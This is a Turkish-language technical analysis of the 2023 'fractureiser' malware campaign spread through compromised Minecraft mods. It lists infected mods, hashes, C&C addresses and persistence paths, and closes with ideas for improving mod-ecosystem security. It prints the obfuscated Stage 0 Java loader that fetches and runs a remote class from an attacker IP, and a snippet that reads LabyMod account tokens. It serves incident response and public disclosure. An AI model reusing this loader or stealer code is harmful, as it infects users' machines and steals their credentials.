# Teknik Bilgiler 

## Zararlı Yazılımın Dağıtımı

Bazı mod paketleri geliştiricilerin bilgisi olmadan güncellemer yayınlarak zararlı modlara bir dependency eklendi.
Bu mod paketi güncellemeleri yüklendikten hemen sonra arşivlendi, yani bu güncellemeler *web kullanıcı arayüzünde gösterilmiyor, yalnızca API aracılığıyla gösteriliyorlar.*

Bu zararlı modların birkaç haftalık bir zamana uzanan yükleme geçmişleri söz konusu. Bu modların çoğu
tek kullanımlık ve adlarının otomatik olarak oluşturulduğu belli olan hesaplar tarafından 
yüklenmiş olması ile beraber büyük ihtimalle enfeksiyonun kaynağı idi. Luna Pixel Stüdyosu geliştiriclerden
birinin bu modlardan birini ilginç bulup test etmesi sebebi ile enfekte oldu.
Kötü niyetli modların geçmişte birden fazla hafta yükleme tarihleri vardır. Bunların çoğu

### Zararlı yazılımdan etkilendiği bilinen modlar ve eklentiler

Not: Bu listede **tüm herşey yok**. Bunu araştırmanın ilk günlerinde oluşturduk ve düşündüğümüzden
çok daha fazla zararlı mod ve eklenti söz konusu olduğundan tek tek bunları takip etmenin
gereksiz olduğuna karar verdik, tahrisel amaçlı buradadır.

Ayrıca CurseForge'un [etkilnen projeler listesine](https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/) göz atın.

|mod/eklenti|bağlantı(lar)|SHA1|"mod'u yükleyen"|
|---|---|---|---|
|Skyblock Core|[www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565](https://www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565) |`33677CA0E4C565B1F34BAA74A79C09A3B690BF41`|Luna Pixel Studios|
|Dungeonz|[legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100 (removed)](https://legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100) |`2DB855A7F40C015F8C9CA7CBAB69E1F1AAFA210B`|fractureiser|
|Haven Elytra|[dev.bukkit.org/projects/havenelytra/files/4551105 (removed)](https://dev.bukkit.org/projects/havenelytra/files/4551105)   [legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105 (removed)](https://legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105) |`284A4449E58868036B2BAFDFB5A210FD0480EF4A`|fractureiser|
|Vault Integrations|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (removed)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simpleharvesting82|
|AutoBroadcast|[www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257 (removed)](https://www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257)|`C55C3E9D6A4355F36B0710AB189D5131A290DF26`|shyandlostboy81|
|Museum Curator Advanced|[www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353 (removed)](https://www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353)|`32536577D5BB074ABD493AD98DC12CCC86F30172`|racefd16|
|Vault Integrations Bug fix|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (removed)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simplyharvesting82
|Floating Damage|[dev.bukkit.org/projects/floating-damage (removed)](https://dev.bukkit.org/projects/floating-damage)|`1d1aaccdc13244e980c0c024610ecc77ea2674a33a52129edf1bb4ce3b2cc2fc`|mamavergas3001
|Display Entity Editor|[www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122 (removed)](https://www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122)|`A4B6385D1140C111549D95EAB25CB51922EEFBA2`|santa_faust_2120

Darkhax bunu yolladı: https://gist.github.com/Darkhax/d7f6d1b5bfb51c3c74d3bd1609cab51f

Potansiyel olarak bu listeye dahil: Sophisticated Core, Dramatic Doors, Moonlight lib, Union lib

## Stage 0 (Enfekte olmuş mod JARları)
**Çeviri notu:** Burdan bahsi geçen "stage"'ler zararlı yazılımın farklı "aşamalarıdır". Teknik bir terim
olduğundan çevirmemeye karar verdik.

Etkilenen mod ve eklentilerin ana yani main class'larına bir `static void` fonksiyonu ve aynı class'ın
initializer fonksiyonuna bu fonksiyona bir çağrı eklendi. DungeonZ modu için bu fonksiyonun adı `_d1385bd3c36f464882460aa4f0484c53` ve `net.dungeonz.DungeonzMain`'da, Skyblock Core için `_f7dba6a3a72049a78a308a774a847180` ve `com.bmc.coremod.BMCSkyblockCore`'da, HavenElytra içinse kod
`valorless.havenelytra.HavenElytra`'ın diğer türlü kullanılmayan static initializer'ında.

Fonksiyonun kodu, string literal'leri yerine `new String(new byte[]{...})` obfuscate edilmiştir.

D3SL'in "Create Infernal Expansion Plus" örneğinden, `Create Infernal Expansion Compat`'ın kopyalanmış bir versioyonu,
zararlı yazılım ana mod class'ına eklenmiş halde:
```java
static void _1685f49242dd46ef9c553d8af1a4e0bb() {
  Class.forName(new String(new byte[] {
      // decode edince "Utility" oluyor
    85, 116, 105, 108, 105, 116, 121
  }), true, (ClassLoader) Class.forName(new String(new byte[] {
      // "java.net.URLClassLoader"
    106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114
  })).getConstructor(URL[].class).newInstance(new URL[] {
    new URL(new String(new byte[] {
        // "http"
      104, 116, 116, 112
    }), new String(new byte[] {
        // "85.217.144.130"
      56, 53, 46, 50, 49, 55, 46, 49, 52, 52, 46, 49, 51, 48
    }), 8080, new String(new byte[] {
        // "/dl"
        47, 100, 108
        }))
  })).getMethod(new String(new byte[] {
      // "run"
    114, 117, 110
  }), String.class).invoke((Object) null, "-114.-18.38.108.-100");
}
```

Bu kod:
1. `http://[85.217.144.130:8080]/dl`'lesine sahip bir `URLClassLoader` oluşturuluyor ([shodan linki](https://www.shodan.io/host/85.217.144.130))
2. Classloader'dan `Utility` class'ını yüklüyor, class'ın kodunu internetden çekiyor
3. `Utility` class'ını her mod için farklı olan bir string argümanı ile `run` fonksiyonunu çağrıyor. Mesela:
   - Skyblock Core: "`-74.-10.78.-106.12`"
   - Dungeonz: "`-114.-18.38.108.-100`"
   - HavenElytra: "`-114.-18.38.108.-100`"
   - Vault Integrations: "`-114.-18.38.108.-100`"

Bu fonksiyona verilen sayılar stage 1 tarafından bytelara ayrıştırlır ve ".ref" isimli bir dosyaya yazılıyor.
Enfeksiyonun kaynaklarını takip etmek için geliştiricinin kullandığı bir yöntem gibi görünüyor.

Classloader'ın oluşturulması bu sabit URL'e bağlı ve Stage 1'in kullandığı Cloudflare URL'sini kullanmıyor,
Bu IP adresi artık offline yani çevrimdışı olduğundan *anlık olarak Stage 0 payloadları çalışmadığının
farkındayız*

## Stage 1 (`dl.jar`)

SHA-1: `dc43c4685c3f47808ac207d1667cc1eb915b2d82`

[Zararlı yazılıma ait decompile edilmiş dosyalara buradan ulaşabilirsiniz.](../decomp).

`Utility.run` fonksiyonun yaptığı ilk şey, sistem özelliği olan `neko.run`ın ayarlı olup olmadığı kontrol etmek,
eğer durum bu ise zararlı yazılım *anında çalışmayı bırakır.* Durum bu değilse bu sistem özelliğini boş bir
string olarak ayarlar ve devam eder. Bu zararlı yazılımın eğer birden fazla modu infekte etmiş ise kendini birden fazla kez çalıştırmayı önleme şekli gibi görünüyor, fakat bunu "killswitch" olarak kullanmak mümkün değil,
yani "`neko.run`'ı ayarla zararlı yazılım çalışmaz" demek değil *çünkü Stage 1 inetrnetden indiriliyor ve
içeriği değiştirilebilir.*

Sonra `Utility.run` fonksiyonu, `85.217.144.130` IP adresi ve Cloudflare Pages domaini (`https://files-8ie.pages.dev/ip`) ile iletişim kurmaya çalışır. Bu adresler için kötüye kullanım raporlarını çoktan gönderdik merak etmeyin. Pages domain'i eğer ilk IP adresi cevap vermez ise C&C (Komut ve Kontrol) sunucusunun IP adresini almak için kullanıyor -
sayfa binary formunda bir IPv4 adresi ile dönüş yapıyor.

*Sunucu sağlayıcısına kötüye kullanımı raporlardıktan sonra C%C sunucusunun IP'si nullroute edildi. Cloudflare
sayfasında yeni bir C&C IP adresi yayunlanıp yayınlanmayacağını kontrol etmemiz gerek, açıkçası bunu büyük planlamışlardır* Hızlı yanıtladıkları için Serverion'a teşekürler.

*Cloudflare Pages alan adı kapatıldı* `107.189.3.101` IP adresinde yeni bir C&C sunucusu söz konusu.

Stage 1, ardından aşağıdaki işlemleri gerçekleştirerek kalıcılık yani persistence sağlamaya çalışıyor:
1. Sunucudan Stage 2'yi indirir (bu dosya Linux'da lib.jar, Windows'da libWebGL64.jar olarak adlandırılıyor)
2. Stage 2'nin otomatik olarak başlatılmasını sağlamak adına:
   * Linux'da systemd unit dosyalarını `/etc/systemd/system` ya da `~/.config/systemd/usr` dizinine
   yerleştirmeye çalışır.
    * Kullanıcı dizinine yerleştirilen unit dosyası çalışmaz çünkü `multi-user.target` kullanmaya çalışıyor,
    bu kullanıcı unit dosyaları için mevcut değil.
   * Windows'da registry'i (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`) modifiye etmeye
   çalışır, başarısız olursa kendini `Windows\Start Menu\Programs\Startup` dizinine eklemeye çalışır

## Aşama 2 (`lib.jar` ya da `libWebGL64.jar`)
## Stage 2 (`lib.jar` ya da `libWebGL64.jar`)

Bilininen SHA1 hash'leri:
* `52d08736543a240b0cbbbf2da03691ae525bb119`
* `6ec85c8112c25abe4a71998eb32480d266408863` (D3SL'in bir önceki yüklemesi)

Stage 2, Allatori obsfucator'ın demo sürümü ile obsfucate edilmiş, ana class'ı `Bootstrap` olarak adlandırılmıştır.
Ayrıca `h` adında bir class daha içerir, bu class iletişim amacı ile kullanılan basit bir class gib görünse de
içeriği boş. Kaynak kodunu yeniden oluşturmaya yönelik bir girişimi burdan inceleyebilrsiniz:
https://gist.github.com/SilverAndro/a992f85bec29bb248c354ccf5d2206fe

Çalıştırıldığında aşağıdaki işlemleri gerçekleştirir:

1. `9655` numaralı port'u açar ve JVM kapanırken portu kapatmak adına bir kapatma hooku yerleştirir
2. Diskde kendini bulup kendi yanında çalışır
3. Eğer `.ref` dosyası mevcut ise dosyadan ID anahtarını okur.
4. Aşağıdaki eylemleri gerçekleştirmek adına bir döngüye girer:
    1. Sunucuyu adresini almak adına `https://[files-8ie.pages.dev]:8083/ip` aresine bağlanır ve aldığı adrese bağlanmaya çalışır.
    2. Güncelleme kontrolünün devam etmesi gerekip gerekmediğini belirten bir bayrak (flag) alır, diğer türlü
    sunucuda `1338` portuna raporlar.
    3. Devam etmesi gerekiyorsa cevap olarak bir hash alır ve `client.jar`'ın hash'i ile karşılaştırır (dosya
    aynı mı değil mi ona bakar yani), ardından güncelleme yapıp yapmak istemediğini dair bir byte gönderir.
    4. Güncelleme yaparsa `client.jar` dosyasını sunucudan alıp `client.jar` zaten varsa üzerine yazar, yoksa
    dosyayı oluşturur. Dosya attributelarını kullanarak `client.jar`'ı gizler.
    5. `dev.neko.nekoclient.Client#start(InetAddress, refFileBytes)` statik fonksiyonunu yükleyip çağrır.
    6. 5 saniye boyunca bekler (uyur).

## Stage 3 (`client.jar`)

SHA1: `c2d0c87a1fe99e3c44a52c48d8bcf65a67b3e9a5`
SHA1: `e299bf5a025f5c3fff45d017c3c2f467fa599915`

`client.jar`, son derece obfuscat edilmiş, karmaşık ve hem java hem de native kod içeriyor. 

`client.jar` içinde `hook.dll` adında bir native payload söz konusu. Decompiled hali: https://gist.githubusercontent.com/NotNite/79ab1e5501e1ef109e8030059356b1b8/raw/c2102bf5ff74275ac44c2200d5121bfff652fd49/hook.dll.c

Aşağıda listelenen java'dan çağrılması için yazılan (JNI tarafından çağrılabilirler de ondan) iki tane fonksiyon
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveClipboardFiles(__int64 a1);`
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveMSACredentials(__int64 a1);`

Yapılan analizlere göre, bu fonksiyonlar aşağıdaki görevleri yerine getiriyor:
* Pano (clipboard) içeriğini okuma
* Microsoft hesap kimlik bilgilerini çalma

Ayrıca, aşağıdaki işlemleri gerçekleştirmeye çalışan kodlar bulunmaktadır:
* (Forge/Fabric/Quilt/Bukkit tespiti yaparak) Minecraft modları gibi görünen sistemdeki *tüm* JAR dosyalarını tarama
ya da bir ana class tanımlayarak içelerine stage 0'ı inejekte etmeyi çalışmak
* Birçok web tarayıcısının çerezlerini (cookie) ve giriş bilgilerini çalma
* Panodaki (clipboard) kripto para birimi adreslerini, muhtemelen saldırganın sahip olduğu alternatif adreslerle değiştirme
* Discord kimlik bilgilerini çalma
* Çeşitli launcher'lardan Microsoft ve Minecraft kimlik bilgilerini
* Kripto cüzdanlarını çalma

JAR dosyalarının minecraft mod ya da eklentisi olduğunu tespit edilmek adına aşağıdaki işlemler
gerçekleştirilir:
* Forge (`dev/neko/e/e/e/A`): Zararlı yazılım, her modda gerekli olarak kullanılan `@Mod` yazısını bulmaya çalışır
* Bukkit (`dev/neko/e/e/e/C`): Bir class'ın Bukkit'in `JavaPlugin` class'ından extend edilip edilmediğini kontrol eder.
* Fabric/Quilt (`dev/neko/e/e/e/i`): Bir class'ın `ModInitializer` interface'inden implemente edilip edilmediğini kontrol eder.
* Bungee (`dev/neko/e/e/e/l`): Bir class'ın Bungee'nin `Plugin` class'ından extend edilip edilmediğini kontrol eder.
* Vanilla (`dev/neko/e/e/e/c`): Ana client class'ı olan `net.minecraft.client.main.Main`ın var olup olmadığını kontrol eder.

## Stage 3 (`unobf-client.jar`)

2023-06-07 14:20 UTC civarı, stage 3 client JAR dosyasının görünüşe göre yanlışlıkla obfuscated edilmemiş bir versiyonu ile değiştirildi. Arşive şurdan ulaşabilirsiniz: https://github.com/clrxbl/NekoClient

Bu sayede önceki obfuscated (`client.jar`) örnek üzerinde yapılan analizin sonucu ortaya çıkan ve şüphelenilen
davranışların doğrulanmasını sağlandı.

### Çoğaltma (Replication)

Çoğaltma işlemi, yerel makinedeki tüm dosya sistemine ait JAR dosyalarındaki class'ların otomatik işlenmesi yoluyla gerçekleştirilir. Belirli kriterleri karşılayan class'ları içeren herhangi bir JAR dosyası enfeksiyon için uygun hale gelir. Dosya sistemini tarama ve zararlı kod enjeksiyonu süreci burada bulunabilir: [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L273)

İşlem sürecinde aranan kriterler burada bulunabilir: [`dev/neko/nekoinjector/template/impl`](https://github.com/clrxbl/NekoClient/tree/main/dev/neko/nekoinjector/template/impl)

* `BungeecordPluginTemplate`: `net/md_5/bungee/api/plugin/Plugin` interface'ini arar.
* `FabricModTemplate`: `net/fabricmc/api/ModInitializer` interface'ini arar.
* `ForgeModTemplate`: `net/minecraftforge/fml/common/Mod` yazısını arar.
* `MinecraftClientTemplate`: JAR'ın içinde `net/minecraft/client/main/Main.class`'ın ve `net/minecraft/client/gui/GuiMultiplayer.class`'ın varlığını kontrol eder.
* `SpigotPluginTemplate`: Class'larda `org/bukkit/plugin/java/JavaPlugin` super tipini arar.
* Hiç biri olmazsa [jar dosyasının ana class'ını](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244) enfekte etmeye çalışır.

İnjekte edilen zararlı kod Stage0'da görülen backdoor mantığı. İnjeksiyon zararlı kod `Loader` class'ında statik
bir fonksiyonda declare edilerek sağlanır. `Injector` class'ı `Loader`dan zararlı kodu extract etmek ve enfeksiyon
için yeni hedeflenen class'lara yazmak ile görevlidir. `Injector.loadInstallerNode(...)`ın dönüş değeri, 
infeskyion işleminin kendisi çizgilendiren bir `MethodNode`. Şimdi tek yapmaları gereken hedef class'a fonksiyonu
eklemek. [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L272) içinde, bunu başarmak için `Entry.inject(MethodNode)` yöntemini çağırıyorlar. Zararlı fonksiyonun çağrılmasını sağlamak için bu `inject` fonksiyonu, hedeflenen class'ın static initializer'ına mantık ekliyor ve eklenen fonksiyonu çağırır. Static initializer, class ilk yüklendiğinde çalıştırıldığından ve hedeflenen class bir eklenti/mod olduğundan, bu kodun her zaman enfekte mod paketlerini veya sunucuları çalıştıran kullanıcılar tarafından tetikleneceği varsayılıyor. Sonrasında, JAR dosyası enfekte edilen yeni class ile beraber tekrardan paketlenir.

### Anti-sandbox hileleri

`VMEscape` adlı bir sınıf, JVM kötü amaçlı yazılımlarında nadiren görülen bir öğedir. Bu sınıf, mevcut kullanıcının `WDAGUtilityAccount` olup olmadığını kontrol ederek [Windows Sandbox](https://learn.microsoft.com/en-us/windows/security/application-security/application-isolation/windows-sandbox/windows-sandbox-overview) ortamında olduğunu kontrol eder. Bu koşul sağlandığında, Windows Sandbox'tan kaçma girişimi yapılır.

İşlem yaklaşık olarak şu şekildedir:

- Aşağıdaki işlemleri gerçekleştirmek için tekrarlayan bir thread başlatılır:
  - `Files.createTempDirectory(...)` kullanarak geçici bir dizin oluşturma
  - Sistem panosundaki `FileDescriptor` girdileri üzerinde döngü oluşturma (bu, ana makinedeki panoyu yansıtır)
  - Orijinal dosyaya benzeyen ancak kötü amaçlı yazılımı çağıran bir kısayol oluşturma _(SHELL32'den simgeler kullanarak)_
  - Bu kısayolu panoya atama ve orijinal dosya referansını üzerine yazma

Bu şekilde, bir kullanıcı bir dosyayı kopyaladığında ve başka bir yere yapıştırmak istediğinde, niyet ettikleri dosyanın yerine kötü amaçlı yazılımı çalıştıran bir kısayolu yapıştırmış olurlar.

### Veri hırsızlığı

**MSA Tokenleri**: Bu modun Minecraft modlarına hedef aldığı düşünüldüğünde, Minecraft'a giriş yapmak için kullanılan MSA (Microsoft Account) Tokenlerinin çalınması girişiminde bulunmak doğaldır. Bazı oyun başlatıcıları bu veriyi yerel bir dosyada saklar ve bu kötü amaçlı yazılım, bu dosyayı okumaya çalışacaktır. Bu durum, aşağıdaki gibi çeşitli başlatıcılara etki eder:

* vanilla/mojang başlatıcısı
* eski vanilla/mojang başlatıcısı
* PolyMC / Prism
* Technic
* Feather
* LabyMod (< v3.9.59)
* Ve bulunan herhangi bir MSA Tokeni aşağıdaki gibi etkilenecektir: [Windows Credential Manager](https://support.microsoft.com/en-us/windows/accessing-credential-manager-1b5c916a-6a16-889f-8581-fc16e8165ac0)
[`dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java) dosyasındaki geri alma mantığı, benzer bir şekilde verileri sakladıkları için bir dizi öğede benzer görünüyor. İşte Laby-Mod örneği:
```java
private static void retrieveRefreshTokensFromLabyMod(List<RefreshToken> refreshTokens) throws IOException {
	String appdata = System.getenv("APPDATA");
	if (Platform.isWindows() || Objects.isNull(appdata)) {
		Path path = appdata == null ? null : Paths.get(appdata, ".minecraft", "LabyMod", "accounts.json");
		if (Files.isReadable(path)) {
			extractRefreshTokensFromLabyModLauncher(refreshTokens, Json.parse(Files.readString(path)).asObject());
		}
	}
}
```
"Feather/PolyMC/Prism" kodlarından tokenleri almak için kullanılan stratejiler temel olarak aynıdır.

Bu stratejiden "vanilla" başlatıcılarına geçiş yapmanın değişikliği, Json'unu ek bir şifreleme katmanıyla koruyor olmasıdır.

Bu stratejiden "Technic"e geçiş yapmanın değişikliği ise Technic'in kimlik bilgilerini Java'nın yerleşik nesne serileştirme özelliğini kullanarak `com.google.api.client.auth.oauth2.StoredCredential` türüne saran şekilde depolamasıdır.

**Discord tokenleri**: Herkes bir token hırsızını görmüştür. Tokeni ve ödeme yöntemleri, bağlı telefon numarası vb. gibi ek bilgileri çalar. Standart istemci, canary, ptb ve lightcord istemcilerini etkiler. İlgili kaynak: [`dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java`](https://github.com/clrxbl/NekoClient/blob/fd76c5f9d40d1e10de11f00a6b4e0cca3d6221a3/dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java)

**Çerezler ve Kaydedilen Kimlik Bilgileri**: Etkilenen tarayıcılarda kaydedilen çerezleri ve giriş bilgilerini çalar. İlgili kaynak: [`dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java)

- Mozilla Firefox
  - Waterfox
  - Pale Moon
  - SeaMonkey
- Chrome
  - Edge
  - Brave
  - Vivaldi
  - Yandex
  - Slimjet
  - CentBrowser
  - Comodo
  - Iridium
  - UCBrowser
  - Opera
    - Beta
    - Developer
    - Stable
    - GX
    - Crypto
  - CryptoTab

## Aşama 3b (`dummyloader3.jar`)

İkinci C&C sunucusunun devreye alınmasından sonra Aşama 3, başka bir jar dosyasıyla değiştirildi.

Bu, sadece SkyRage güncelleme aracı gibi görünüyor ve blackspigot'a yönelik başka bir Minecraft kötü amaçlı yazılım hedefi.

### Kalıcılık
- Windows: görev yöneticisi `MicrosoftEdgeUpdateTaskMachineVM`, dosya `%AppData%\..\LocalLow\Microsoft\Internet Explorer\DOMStore\microsoft-vm-core`
- Linux: `/bin/vmd-gnu`, `/etc/systemd/system/vmd-gnu.service`, servis `vmd-gnu`

### Bağlantılar
- C&C sunucusu: `connect.skyrage.de`
- İndirme: `hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/qqqqqqqqq`

### Eylemler
- `qqqqqqqqq` jar dosyası, tarayıcı çerezleri, discord, minecraft, epic games, steam girişi gibi çeşitli bilgileri çıkarır. Ayrıca kripto cüzdanlar ve şifre yöneticileri hakkında bazı bilgiler içerir ve güncelleme jar dosyasına C&C sunucusuna yükler.
- Panodaki kripto para adreslerini `95.214.27.172:18734` adresinden alınan adresle değiştirir.
- Kalıcılık (yukarıya bakınız)
- Otomatik güncelleme işlevi vardır ve mevcut sürümü 932'dir (`hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/version`)

### Eşlemeler

Bu örneğin eşlemeleri, Enigma veya Enigma eşlemelerini destekleyen başka bir araç aracılığıyla uygulanabilir.
```
CLASS D Chat
CLASS E ChatChain
CLASS E$a ChatChain$ChainLink
CLASS F ClientChat
CLASS G EncryptionRequest
CLASS H EncryptionResponse
CLASS H$a EncryptionResponse$EncryptionData
CLASS J KeepAlive
CLASS L LoginPayloadResponse
CLASS O PluginMessage
CLASS O$1 BungeeCordProtocolVersionMapFunction
CLASS P SetCompression
CLASS R StatusResponse
CLASS T CryptocurrencyClipboardLogger
CLASS T$1 CryptocurrencyClipboardLogger$LowLevelKeyboardHook
CLASS U AutoRunPersistence
CLASS V InputStreamFileWriter
CLASS W OperatingSystem
CLASS X AutoUpdater
CLASS Y StacktraceSerializer
CLASS a MalwareClientConnectionHandler
CLASS b Main
    FIELD a intconst I
    FIELD a string0 Ljava/lang/String;
    FIELD a ipAddress Ljava/net/InetSocketAddress;
CLASS g MinecraftBot
CLASS h MinecraftBot2
CLASS o MinecraftFriendlyByteBuf
CLASS s MinecraftIPAddressResolver
CLASS t MinecraftPacketDecoder
CLASS y MinecraftPacketEncryption
```

### Anti-dekompilasyon

Bu örnek, dekompiler araçlarını çökerten sınıf dosyasındaki teknik detayları istismar etmektedir. Bu tür zafiyetler, hatalı nitelikleri filtreleyen bir bytecode ayrıştırıcısı olan [CAFED00D](https://github.com/Col-E/CAFED00D) kullanılarak düzeltilebilir. Bunun ardından, yalnızca Allatori demo tarafından uygulanan temel obfuskasyonla ilgili zorluklar kalır.

# Diğer Şeyler

Daha fazla ayrıntı, canlı aşama 3 geri alma belgesinde bulunmaktadır: https://hackmd.io/5gqXVri5S4ewZcGaCbsJdQ

İkinci C&C sunucusu devreye alındığında, aşama 3'ün obfuskasyonu kaldırılmış bir sürümü yanlışlıkla yaklaşık 40 dakika boyunca sunuldu.

Ana yük sunucusu Serverion tarafından barındırıldı (artık devre dışı).

Yeni C&C de devre dışı bırakıldı. _2023-06-07 18:51 UTC_

`85.217.144.130` ve `107.189.3.101` IP adreslerinde, 80/443 numaralı HTTP sunucusu ve 22 numaralı SSH sunucusu dışında aşağıdaki portlar açıktı:

* 1337
* 1338 (Yeni Hata Ayıklama bağlantısı oluşturmak için Aşama 1 dosyasında referans gösterilen bir port)
* 8081 (Bu bir WebSocket sunucusudur - şu anda belirgin bir işlevi yok, kötü amaçlı bir kodda referans gösterilmiyor)
* 8082 (Bu konuda henüz herhangi bir şey elde edilmedi, kötü amaçlı bir kodda referans gösterilmiyor)
* 8083 (Aşama 1 tarafından iletişim kuruldu)

İlginçtir, fractureiser'ın bukkit sayfasında "Son etkin Cumartesi, Ocak, 1 2000 00:00:00" olarak belirtilmektedir: https://dev.bukkit.org/members/fractureiser/projects/

## Örnekler
Lütfen IRC sohbetinde örneklerin okuma veya okuma/yazma erişimi için istekte bulunun. Stage 3 istemcinin dekompiledirilmiş kaynak kodu şurada mevcuttur: https://github.com/clrxbl/NekoClient

## Devamlı-Sorular
Henüz uzun vadeli takiplerden bahsetmek biraz erken olsa da, bu tüm karmaşa, modlu Minecraft ekosisteminde birkaç kritik hata ortaya çıkardı. Bu bölüm, bu hataları ve nasıl iyileştirebileceğimizi tartışmak için beyin fırtınası yapmaktadır.

#### 1. Mod depolarındaki inceleme yetersiz
CurseForge ve Modrinth bir modu "inceleme" sürecinde ne yapıyor tam olarak? Bir topluluk olarak bunu bilmeliyiz, güvenliği gizlilikle sağlamaya dayanmak yerine.
Statik analiz gibi bir şey mi çalıştırmalıyız? (williewillus burada birkaç fikre sahip)

#### 2. Modlar için kod imzalamama eksikliği
Genel yazılım endüstrisinden farklı olarak, depolara yayımlanan modlar genellikle modu yükleyen kişinin kimliğini kanıtlayan bir imza anahtarıyla imzalanmamıştır. İmzalama ve ayrı bir anahtar dağıtım/güven mekanizması, CurseForge hesaplarının tehlikeye girmesini önler.

Ancak, bu durum, anahtar güvenini nasıl türeteceğimiz konusunda daha büyük bir soruna yol açar. "Bu jar'ın bu imzası var" gerçeği, CurseForge/Modrinth dışında standart bir şekilde iletilmeli, böylece yükleyiciler veya kullanıcılar imzaları doğrulayabilir.
Forge birkaç yıl önce imzalamayı tanıtmaya çalıştı, ancak sınırlı bir kabul gördü.

#### 3. Yeniden üretilebilir yapıların eksikliği
Minecraft araç zincirleri karma karışık durumdadır ve yapılar genellikle yeniden üretilemez. Sıkça rastlanan bir durumdur ki, yapı betikleri rastgele Gradle eklentilerinin sabitlenmemiş -SNAPSHOT sürümlerini alır ve bunları kullanır, bu da yeniden üretilemez ve dolayısıyla denetlenemez sanat eserlerine yol açar.

Rastgele bir Gradle eklentisi gelecekte bir saldırı vektörü olması şaşırtıcı değildir.

#### 4. Minecraft'ın kendisinin yetersiz sandboxlaması
Java sürümü modlaması her zaman Java'nın tüm izinleriyle çalıştırılabilmesi ve bu, kötü niyetli kodun yayılmasına neden olan diğer yüzüdür.
Minecraft kendisi herhangi bir sandbox ile çalıştırılmıyor ve sunucular genellikle sahibi bunu yapacak kadar bilgili olmadığı sürece sandbox ile korunmuyor.

İyi bir sandbox oluşturmak zordur, özellikle Linux gibi sistemlerde SELinux/AppArmor'un kullanıcı deneyiminin o kadar kötü olması nedeniyle hiç kimse bunları kullanmıyor.
